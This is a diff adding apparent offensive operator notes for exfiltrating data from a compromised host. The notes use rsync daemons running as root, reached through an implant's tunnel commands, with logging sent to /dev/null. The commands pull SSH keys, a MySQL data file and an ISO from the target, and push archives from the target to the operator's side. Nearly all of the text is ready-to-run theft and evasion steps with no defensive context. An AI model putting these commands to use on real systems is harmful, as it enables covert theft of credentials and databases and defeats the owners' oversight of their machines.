@@ -1,0 +1,123 @@
+
+# NOTE THIS IS FOR ARCHIVAL PURPOSES ONLY.
+#
+# See this usage for current way to use this method:
+
+-gs rsync -h
+
+
+
+# DID YOU READ THE ABOVE? DO NOT USE THE BELOW, USE -gs rsync INSTEAD.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Seriously, why are you still here?
+
+
+
+
+
+
+# METHOD 1: UPLOAD config file c to target (not preferred).
+# config file named c
+cat <<EOF > c
+uid = root
+use chroot = no
+log file = /dev/null
+[root]
+path = /
+EOF
+
+----
+# TARGET WINDOW 1:
+-tunnel
+l 3281 127.0.0.1
+
+# TARGET WINDOW 2:
+# rsync server
+rsync --daemon --no-detach --config=c --port=3281 --address=127.0.0.1 .
+
+# LOCALLY:
+# rsync client:
+rsync -vv rsync://127.0.0.1:3281/root/root/.ssh/known_hosts tmp
+rsync --recursive -vv rsync://127.0.0.1:3281/root/root/.ssh tmp
+rsync -av rsync://127.0.0.1:3281/root/root/grabit.iso .
+rsync -av rsync://127.0.0.1:3281/root/var/db/mysql/eklaaec2_hlesy77/post.MYD .
+
+
+
+# METHOD 2: Local server, local config file, client on target (preferred).
+# LOCALLY:
+# rsync server:
+cat <<EOF  > c
+uid = root
+use chroot = no
+log file = /dev/null
+[root]
+path = /current/down
+read only = false
+EOF
+
+rsync --daemon --no-detach --config=c --port=3281 --address=127.0.0.1 .
+
+# TARGET WINDOW 1:
+-tunnel
+r 3281 127.0.0.1
+
+# TARGET WINDOW 2:
+rsync -av a.tgz rsync://127.0.0.1:3281/root
+rsync -av pmtext.* rsync://127.0.0.1:3281/root
+
